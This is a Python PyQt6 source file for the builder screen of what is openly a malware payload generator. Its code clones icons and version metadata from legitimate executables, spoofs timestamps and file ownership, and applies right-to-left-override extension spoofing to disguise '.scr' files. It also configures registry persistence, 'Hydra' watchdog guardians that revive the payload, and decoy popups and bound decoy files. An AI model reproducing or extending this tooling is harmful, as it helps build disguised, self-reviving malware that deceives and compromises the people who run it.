# ui/builder_pane.py (Definitive, with Guardian Customization restored)
import os
import uuid
import tempfile
import re
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton,
                             QTextEdit, QCheckBox, QComboBox, QSpinBox, QGroupBox,
                             QFileDialog, QLabel, QStackedWidget, QMessageBox, QFormLayout,
                             QScrollArea, QDateTimeEdit)
from PyQt6.QtCore import pyqtSignal, Qt, QDateTime
import pefile

class BuilderPane(QWidget):
    build_requested = pyqtSignal(dict)

    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager

        self.target_exe_path = None
        self.bind_file_path = None
        self.active_icon_path = None

        self.stack = QStackedWidget()
        main_layout = QVBoxLayout(self); main_layout.setContentsMargins(0,0,0,0)
        main_layout.addWidget(self.stack)

        builder_scroll_area = QScrollArea()
        builder_scroll_area.setWidgetResizable(True)
        builder_scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        builder_widget = QWidget()
        builder_scroll_area.setWidget(builder_widget)

        layout = QVBoxLayout(builder_widget)
        layout.setContentsMargins(10,10,10,10); layout.setSpacing(10)
        
        layout.addWidget(QLabel("<h2>BUILDER</h2>"))

        main_payload_group = QGroupBox("Main Payload")
        main_payload_layout = QVBoxLayout(main_payload_group)
        name_ext_layout = QHBoxLayout()
        self.payload_name = QLineEdit(); self.payload_name.setPlaceholderText("Payload Name")
        self.payload_ext = QLineEdit(); self.payload_ext.setPlaceholderText(".exe")
        self.payload_ext.setFixedWidth(80)
        name_ext_layout.addWidget(self.payload_name, 3); name_ext_layout.addWidget(self.payload_ext, 1)
        main_payload_layout.addLayout(name_ext_layout)
        layout.addWidget(main_payload_group)
        
        cloning_group = QGroupBox("Payload Appearance & Spoofing")
        cloning_layout = QVBoxLayout(cloning_group)
        self.customize_details_checkbox = QCheckBox("Customize File Properties")
        self.customize_details_checkbox.stateChanged.connect(self.toggle_details_view)
        cloning_layout.addWidget(self.customize_details_checkbox)
        self.details_group = QGroupBox("Custom Properties"); self.details_group.setVisible(False)
        details_layout = QFormLayout(self.details_group)
        self.clone_target_button = QPushButton("Clone Icon From Executable (.exe)"); self.clone_target_button.clicked.connect(self.select_clone_target)
        self.set_manual_icon_button = QPushButton("Set Icon Manually (Overrides Cloned Icon)"); self.set_manual_icon_button.clicked.connect(self.select_manual_icon)
        self.target_label = QLabel("Source: None")
        details_layout.addRow(self.target_label); details_layout.addRow(self.clone_target_button); details_layout.addRow(self.set_manual_icon_button)
        self.clone_file_description = QLineEdit(); details_layout.addRow("File Description:", self.clone_file_description)
        self.clone_company_name = QLineEdit(); details_layout.addRow("Company Name:", self.clone_company_name)
        self.clone_product_name = QLineEdit(); details_layout.addRow("Product Name:", self.clone_product_name)
        self.clone_original_filename = QLineEdit(); details_layout.addRow("Original Filename:", self.clone_original_filename)
        self.clone_legal_copyright = QLineEdit(); details_layout.addRow("Legal Copyright:", self.clone_legal_copyright)
        self.clone_file_version = QLineEdit(); details_layout.addRow("File Version (e.g., 1.2.3.4):", self.clone_file_version)
        self.clone_product_version = QLineEdit(); details_layout.addRow("Product Version (e.g., 1.2.3.4):", self.clone_product_version)
        self.spoof_timestamps_checkbox = QCheckBox("Spoof Timestamps"); details_layout.addRow(self.spoof_timestamps_checkbox)
        self.created_time_edit = QDateTimeEdit(QDateTime.currentDateTime()); self.created_time_edit.setCalendarPopup(True); self.created_time_edit.setVisible(False); details_layout.addRow("    Date Created:", self.created_time_edit)
        self.modified_time_edit = QDateTimeEdit(QDateTime.currentDateTime()); self.modified_time_edit.setCalendarPopup(True); self.modified_time_edit.setVisible(False); details_layout.addRow("    Date Modified:", self.modified_time_edit)
        self.spoof_timestamps_checkbox.stateChanged.connect(lambda state: (self.created_time_edit.setVisible(bool(state)), self.modified_time_edit.setVisible(bool(state))))
        self.spoof_owner_checkbox = QCheckBox("Spoof Owner (Requires Admin)"); details_layout.addRow(self.spoof_owner_checkbox)
        self.owner_combo = QComboBox(); self.owner_combo.addItems(["Keep Current", "SYSTEM", "Administrators"]); self.owner_combo.setVisible(False); details_layout.addRow("    New Owner:", self.owner_combo)
        self.spoof_owner_checkbox.stateChanged.connect(self.owner_combo.setVisible)
        cloning_layout.addWidget(self.details_group)
        padding_layout = QHBoxLayout()
        self.padding_checkbox = QCheckBox("Add File Size:")
        self.padding_size_input = QSpinBox(); self.padding_size_input.setSuffix(" KB"); self.padding_size_input.setRange(0, 100000); self.padding_size_input.setValue(1024)
        self.padding_size_input.setEnabled(False)
        self.padding_checkbox.stateChanged.connect(self.padding_size_input.setEnabled)
        self.padding_checkbox.stateChanged.connect(self.on_padding_changed)
        padding_layout.addWidget(self.padding_checkbox); padding_layout.addWidget(self.padding_size_input)
        cloning_layout.addLayout(padding_layout)
        layout.addWidget(cloning_group)
        
        # --- FIX: Restored detailed Hydra UI ---
        persist_group = QGroupBox("Resilience")
        persist_layout = QVBoxLayout(persist_group)
        self.startup_persist = QCheckBox("Startup Persistence (Registry)")
        persist_layout.addWidget(self.startup_persist)
        hydra_header_layout = QHBoxLayout()
        self.hydra_revival = QCheckBox("Hydra Revival (Watchdog)")
        self.hydra_amount = QSpinBox()
        self.hydra_amount.setRange(2, 5)
        self.hydra_amount.valueChanged.connect(self.update_hydra_inputs)
        self.hydra_amount.setVisible(False)
        hydra_header_layout.addWidget(self.hydra_revival)
        hydra_header_layout.addWidget(self.hydra_amount)
        hydra_header_layout.addStretch()
        persist_layout.addLayout(hydra_header_layout)
        self.hydra_guardian_group = QGroupBox("Guardian Configuration")
        self.hydra_guardian_group.setVisible(False)
        self.hydra_guardian_layout = QVBoxLayout(self.hydra_guardian_group)
        self.hydra_inputs = []
        persist_layout.addWidget(self.hydra_guardian_group)
        self.hydra_revival.stateChanged.connect(self.toggle_hydra_options)
        layout.addWidget(persist_group)
        # --- END FIX ---
        
        deception_group = QGroupBox("Deception & Lures"); deception_layout = QVBoxLayout(deception_group); self.custom_popup_checkbox = QCheckBox("Show Custom Popup on First Execution"); deception_layout.addWidget(self.custom_popup_checkbox); self.custom_popup_group = QGroupBox("Popup Message"); self.custom_popup_group.setVisible(False); popup_layout = QVBoxLayout(self.custom_popup_group); self.popup_title_input = QLineEdit(); self.popup_title_input.setPlaceholderText("Popup Title"); self.popup_message_input = QTextEdit(); self.popup_message_input.setPlaceholderText("Popup Message"); self.popup_message_input.setMaximumHeight(80); popup_layout.addWidget(self.popup_title_input); popup_layout.addWidget(self.popup_message_input); deception_layout.addWidget(self.custom_popup_group); self.custom_popup_checkbox.stateChanged.connect(self.custom_popup_group.setVisible); bind_layout = QHBoxLayout(); self.bind_file_button = QPushButton("Bind Decoy File"); self.bind_file_button.clicked.connect(self.select_bind_file); self.bind_label = QLabel("None"); bind_layout.addWidget(self.bind_file_button); bind_layout.addWidget(self.bind_label, 1); deception_layout.addLayout(bind_layout); layout.addWidget(deception_group)

        layout.addStretch()
        self.build_button = QPushButton("Build Payload"); self.build_button.clicked.connect(self.on_build)
        layout.addWidget(self.build_button)
        
        self.build_log_pane = QWidget(); log_layout = QVBoxLayout(self.build_log_pane); self.build_log_output = QTextEdit(); self.build_log_output.setReadOnly(True); self.stop_build_button = QPushButton("Stop Build"); self.stop_build_button.setObjectName("StopBuildButton"); self.stop_build_button.setEnabled(False); self.back_to_builder_button = QPushButton("< Back to Builder"); self.back_to_builder_button.clicked.connect(self.show_builder_pane); self.back_to_builder_button.hide(); log_layout.addWidget(QLabel("<h3>BUILDING PAYLOAD...</h3>")); log_layout.addWidget(self.build_log_output, 1); log_layout.addWidget(self.stop_build_button); log_layout.addWidget(self.back_to_builder_button)
        
        self.stack.addWidget(builder_scroll_area)
        self.stack.addWidget(self.build_log_pane)
        self.update_hydra_inputs(self.hydra_amount.value())

    def on_padding_changed(self, state):
        self.parent().parent().setting_changed.emit("padding_enabled", bool(state))

    def handle_compression_status_change(self, is_compression_enabled):
        self.padding_checkbox.setEnabled(not is_compression_enabled)
        if is_compression_enabled:
            self.padding_checkbox.setChecked(False)

    def on_build(self):
        if not self.payload_name.text():
            QMessageBox.warning(self, "Warning", "Payload name cannot be empty.")
            return

        if self.customize_details_checkbox.isChecked():
            version_pattern = re.compile(r'^\d+\.\d+\.\d+\.\d+$')
            file_version = self.clone_file_version.text()
            product_version = self.clone_product_version.text()
            if file_version and not version_pattern.match(file_version):
                QMessageBox.warning(self, "Invalid Format", "File Version must be in the format 'x.x.x.x' (e.g., 1.0.0.0).")
                return
            if product_version and not version_pattern.match(product_version):
                QMessageBox.warning(self, "Invalid Format", "Product Version must be in the format 'x.x.x.x' (e.g., 2.1.0.0).")
                return
        
        executable_extensions = ['.exe', '.scr', '.com']
        payload_name = self.payload_name.text().strip()
        ext_input = self.payload_ext.text().strip()
        if not ext_input: ext_input = ".exe"
        if not ext_input.startswith('.'): ext_input = '.' + ext_input
        payload_ext = ext_input
        spoofed_ext = None
        if ext_input.lower() not in executable_extensions:
            QMessageBox.information(self, "RLO Spoofing", f"The extension '{ext_input}' is not executable.\nRLO spoofing will be applied and the payload will be built as a '.scr' file.")
            spoofed_ext = ext_input
            payload_ext = ".scr"

        guardian_configs = []
        if self.hydra_revival.isChecked():
            for i, data in enumerate(self.hydra_inputs):
                guardian_name = data["name_widget"].text().strip()
                if not guardian_name:
                    QMessageBox.warning(self, "Warning", f"Guardian #{i+1} name cannot be empty.")
                    return
                guardian_ext_input = data["ext_widget"].text().strip()
                if not guardian_ext_input: guardian_ext_input = ".exe"
                if not guardian_ext_input.startswith('.'): guardian_ext_input = '.' + guardian_ext_input
                guardian_ext = guardian_ext_input
                guardian_spoofed_ext = None
                if guardian_ext_input.lower() not in executable_extensions:
                    guardian_spoofed_ext = guardian_ext_input
                    guardian_ext = ".scr"
                guardian_configs.append({"name": guardian_name, "ext": guardian_ext, "icon": data["icon_path"], "spoofed_ext": guardian_spoofed_ext})

        metadata_spoofing = {
            "timestamps_enabled": self.spoof_timestamps_checkbox.isChecked(),
            "created": self.created_time_edit.dateTime(),
            "modified": self.modified_time_edit.dateTime(),
            "owner_enabled": self.spoof_owner_checkbox.isChecked(),
            "owner": self.owner_combo.currentText()
        }
        cloning_settings = { "enabled": self.customize_details_checkbox.isChecked(), "icon": self.active_icon_path, "version_info": { "FileDescription": self.clone_file_description.text(), "CompanyName": self.clone_company_name.text(), "ProductName": self.clone_product_name.text(), "OriginalFilename": self.clone_original_filename.text(), "LegalCopyright": self.clone_legal_copyright.text(), "FileVersion": self.clone_file_version.text(), "ProductVersion": self.clone_product_version.text() }}
        padding_settings = {"enabled": self.padding_checkbox.isChecked(), "size_kb": self.padding_size_input.value()}

        settings = {
            "payload_name": payload_name, 
            "payload_ext": payload_ext,
            "spoofed_ext": spoofed_ext,
            "metadata_spoofing": metadata_spoofing,
            "cloning": cloning_settings, "padding": padding_settings, "persistence": self.startup_persist.isChecked(),
            "hydra": self.hydra_revival.isChecked(), "guardians": guardian_configs,
            "popup_enabled": self.custom_popup_checkbox.isChecked(), "popup_title": self.popup_title_input.text(), "popup_message": self.popup_message_input.toPlainText(),
            "bind_path": self.bind_file_path, "obfuscation": self.db.load_setting("obfuscation", "None"), "compression": self.db.load_setting("compression", "None"), "build_priority": self.db.load_setting("build_priority", "Normal")
        }
        self.build_requested.emit(settings)

    def toggle_details_view(self, checked): self.details_group.setVisible(checked)
    def toggle_hydra_options(self, checked):
        self.hydra_amount.setVisible(checked)
        self.hydra_guardian_group.setVisible(checked)

    def update_hydra_inputs(self, amount):
        while self.hydra_guardian_layout.count():
            child = self.hydra_guardian_layout.takeAt(0);
            if child.widget(): child.widget().deleteLater()
        self.hydra_inputs.clear()
        for i in range(amount):
            input_data = {"name_widget": None, "ext_widget": None, "icon_button": None, "icon_label": None, "icon_path": None}; row_widget = QWidget(); layout = QVBoxLayout(row_widget); layout.setContentsMargins(0,5,0,5); name_layout = QHBoxLayout()
            name_input = QLineEdit(); name_input.setPlaceholderText(f"Guardian #{i+1} Name")
            ext_input = QLineEdit(); ext_input.setPlaceholderText(".exe")
            ext_input.setFixedWidth(80)
            name_layout.addWidget(name_input, 3); name_layout.addWidget(ext_input, 1)
            input_data["name_widget"] = name_input; input_data["ext_widget"] = ext_input; icon_layout = QHBoxLayout()
            icon_button = QPushButton("Clone Icon From .exe"); icon_button.clicked.connect(lambda chk, index=i: self.select_guardian_icon(index))
            icon_label = QLabel("Icon: None"); input_data["icon_button"] = icon_button; input_data["icon_label"] = icon_label; icon_layout.addWidget(icon_label, 1); icon_layout.addWidget(icon_button); layout.addLayout(name_layout); layout.addLayout(icon_layout); self.hydra_guardian_layout.addWidget(row_widget); self.hydra_inputs.append(input_data)

    def _extract_icon(self, pe, icon_path):
        try:
            rt_group_icon_dir = next((entry for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries if entry.id == pefile.RESOURCE_TYPE['RT_GROUP_ICON']), None)
            if not rt_group_icon_dir: raise Exception("RT_GROUP_ICON resource not found.")
            group_icon_entry = rt_group_icon_dir.directory.entries[0]
            data_entry = group_icon_entry.directory.entries[0]
            grp_icon_dir_rva = data_entry.struct.offset_to_data
            grp_icon_dir_size = data_entry.struct.size
            grp_icon_data = pe.get_memory_mapped_image()[grp_icon_dir_rva : grp_icon_dir_rva + grp_icon_dir_size]
            grp_icon_entries = pefile.GDI_RESOURCES.GRPICONDIRENTRY(grp_icon_data).entries
            best_icon = max(grp_icon_entries, key=lambda i: i.Width * i.Height)
            icon_id = best_icon.nID
            rt_icon_dir = next((entry for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries if entry.id == pefile.RESOURCE_TYPE['RT_ICON']), None)
            if not rt_icon_dir: raise Exception("RT_ICON resource not found.")
            icon_resource_entry = next((entry for entry in rt_icon_dir.directory.entries if entry.id == icon_id), None)
            if not icon_resource_entry: raise Exception(f"Icon with ID {icon_id} not found.")
            icon_data_entry = icon_resource_entry.directory.entries[0]
            icon_rva = icon_data_entry.struct.offset_to_data
            icon_size = icon_data_entry.struct.size
            icon_data = pe.get_memory_mapped_image()[icon_rva:icon_rva + icon_size]
            ico_header = b'\x00\x00\x01\x00\x01\x00'
            ico_dir_entry = bytearray()
            ico_dir_entry.extend(best_icon.Width.to_bytes(1, 'little'))
            ico_dir_entry.extend(best_icon.Height.to_bytes(1, 'little'))
            ico_dir_entry.extend(b'\x00\x00')
            ico_dir_entry.extend(best_icon.wPlanes.to_bytes(2, 'little'))
            ico_dir_entry.extend(best_icon.wBitCount.to_bytes(2, 'little'))
            ico_dir_entry.extend(icon_size.to_bytes(4, 'little'))
            ico_dir_entry.extend((22).to_bytes(4, 'little'))
            with open(icon_path, 'wb') as f:
                f.write(ico_header)
                f.write(ico_dir_entry)
                f.write(icon_data)
        except Exception as e:
            raise Exception(f"Failed during icon parsing: {e}")

    def select_guardian_icon(self, index):
        path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable for Guardian", "", "Executables (*.exe)")
        if path:
            try:
                pe = pefile.PE(path, fast_load=True)
                pe.parse_data_directories()
                icon_path = os.path.join(tempfile.gettempdir(), f"tether_{uuid.uuid4().hex}.ico")
                self._extract_icon(pe, icon_path)
                self.hydra_inputs[index]["icon_path"] = icon_path
                self.hydra_inputs[index]["icon_label"].setText(f"Icon from: {os.path.basename(path)}")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not clone icon: {e}")
                self.hydra_inputs[index]["icon_path"] = None
                self.hydra_inputs[index]["icon_label"].setText("Icon: None")

    def select_clone_target(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "", "Executables (*.exe)")
        if not path: return
        self.target_exe_path = path
        try:
            pe = pefile.PE(path, fast_load=True)
            pe.parse_data_directories()
            icon_path = os.path.join(tempfile.gettempdir(), f"tether_{uuid.uuid4().hex}.ico")
            self._extract_icon(pe, icon_path)
            self.active_icon_path = icon_path
            self.target_label.setText(f"Icon from: {os.path.basename(path)}")
            if hasattr(pe, 'VS_VERSIONINFO') and hasattr(pe.VS_VERSIONINFO[0], 'StringFileInfo'):
                lang_entry = pe.VS_VERSIONINFO[0].StringFileInfo[0].entries
                self.clone_file_description.setText(lang_entry.get(b'FileDescription', b'').decode('utf-8', 'ignore'))
                self.clone_company_name.setText(lang_entry.get(b'CompanyName', b'').decode('utf-8', 'ignore'))
                self.clone_product_name.setText(lang_entry.get(b'ProductName', b'').decode('utf-8', 'ignore'))
                self.clone_original_filename.setText(lang_entry.get(b'OriginalFilename', b'').decode('utf-8', 'ignore'))
                self.clone_legal_copyright.setText(lang_entry.get(b'LegalCopyright', b'').decode('utf-8', 'ignore'))
                self.clone_file_version.setText(lang_entry.get(b'FileVersion', b'').decode('utf-8', 'ignore'))
                self.clone_product_version.setText(lang_entry.get(b'ProductVersion', b'').decode('utf-8', 'ignore'))
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not extract properties: {e}")
            self.active_icon_path = None
            self.target_label.setText("Source: None")

    def select_manual_icon(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Icon File", "", "Icons (*.ico)")
        if path:
            self.active_icon_path = path
            self.target_label.setText(f"Icon: {os.path.basename(path)} (Manual)")

    def select_bind_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Bind")
        if path:
            self.bind_file_path = path
            self.bind_label.setText(os.path.basename(path))

    def show_build_log_pane(self):
        self.build_log_output.clear()
        self.back_to_builder_button.hide()
        self.stop_build_button.setEnabled(True)
        self.stack.setCurrentIndex(1)

    def show_builder_pane(self):
        self.stack.setCurrentIndex(0)